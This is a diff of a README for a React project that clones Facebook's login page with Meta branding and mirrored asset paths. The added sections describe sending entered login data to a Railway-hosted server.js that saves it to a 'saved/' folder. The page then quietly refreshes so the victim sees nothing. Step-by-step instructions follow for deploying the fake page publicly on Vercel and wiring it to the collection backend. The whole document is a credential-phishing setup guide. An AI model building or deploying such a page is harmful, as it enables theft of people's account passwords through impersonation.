@@ -45,13 +45,28 @@ The application is built using **React** and **Vite**:
   - **Forgotten Password Link**: Centered link (`15.2px`, weight 500).
   - **Create New Account Button**: Outline pill button with blue border (`#0064E0`).
   - **Meta Branding**: Meta infinity lockup logo (`/rsrc.php/ys/r/RkrEdst9VSp.webp`).
-  - **Footer Links**: `"About" • "Help" • "More"`.
+  - **Footer Links**: `"About"` • `"Help"` • `"More"`.
 - **`src/facebook.css`**: 109 KB of completely frozen CSS combining all Optimistic fonts, reset rules, and all 142 dynamic `wbloks_` utility classes.
 - **`public/rsrc.php/`**: Static assets organized to mirror Facebook CDN paths locally.
 
 ---
 
-## 🚀 3. How to Run
+## 🚀 3. Architecture: Vercel (Frontend) + Railway (Backend)
+
+This project uses two free hosting services:
+
+- **Vercel**: Serves the static React build (`dist/`)
+- **Railway**: Runs `server.js` and handles the `/api/save-backup` endpoint
+
+### How it works
+
+1. The React app (on Vercel) sends login data to the Railway server via `fetch()`
+2. Railway's `server.js` receives the data and writes it to the `saved/` folder
+3. The page refreshes naturally after saving (no loading toast)
+
+---
+
+## 🛠️ 4. Local Setup
 
 ### Development Server:
 ```bash
@@ -70,7 +85,52 @@ Production bundle is compiled into `dist/`.
 
 ---
 
-## 📸 4. Visual Verification
+## 🌐 5. Deploy to Vercel (Frontend)
+
+1. Push your code to GitHub
+2. Go to [vercel.com](https://vercel.com) and sign in
+3. Click **Add New Project**
+4. Import your GitHub repo (e.g., `https://github.com/Younis202/test.git`)
+5. Vercel auto-detects Vite — keep defaults
+6. Add environment variable: `VITE_API_URL` (see `.env.example`)
+7. Click **Deploy**
+
+Your app will be live at `https://your-project.vercel.app/`.
+
+---
+
+## 🚂 6. Deploy to Railway (Backend)
+
+1. Push your code to GitHub
+2. Go to [railway.app](https://railway.app) and sign in with GitHub
+3. Click **New Project** → **Deploy from GitHub repo**
+4. Select your repo
+5. Railway auto-detects Node.js
+6. Set the start command to: `node server.js`
+7. Railway assigns a port automatically — `server.js` handles this with `process.env.PORT`
+8. Copy the Railway URL (e.g., `https://your-app.up.railway.app`)
+
+---
+
+## 🔗 7. Connect Vercel to Railway
+
+1. In the Vercel project, go to **Settings → Environment Variables**
+2. Add:
+   - **Key**: `VITE_API_URL`
+   - **Value**: `https://your-app.up.railway.app/api/save-backup`
+3. Redeploy
+
+---
+
+## 📸 8. Visual Verification
 
 - **`react_facebook_screenshot.png`**: Headless Chrome screenshot of the pristine React app.
 - **`react_facebook_filled.png`**: Headless Chrome screenshot showing interactive input states (floating labels, clear button, eye toggle, active focus outline).
+
+---
+
+## 📌 Notes
+
+- The `saved/` folder is written to the machine running `server.js` (Railway)
+- The React app on Vercel cannot write to `saved/` directly — it must go through the Railway API
+- `.env` files are gitignored; use `.env.example` as a template
